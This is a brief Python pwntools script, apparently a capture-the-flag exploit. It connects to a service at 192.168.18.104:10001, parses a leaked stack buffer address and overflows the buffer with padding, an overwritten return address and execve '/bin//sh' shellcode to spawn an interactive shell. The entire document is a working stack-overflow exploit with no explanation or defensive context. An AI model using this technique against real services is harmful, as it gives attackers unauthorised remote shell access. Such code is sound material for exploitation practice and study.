from pwn import *

p = remote("192.168.18.104",10001)

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvuntil('[')

buf_addr = p.recvuntil(']', drop=True)

buf_addr = int(buf_addr,16)

returnaddr = buf_addr + 0x10 + 0x8 + 0x8

payload = 'A' * 0x18 + p64(returnaddr) + shellcode

p.sendline(payload)

p.interactive()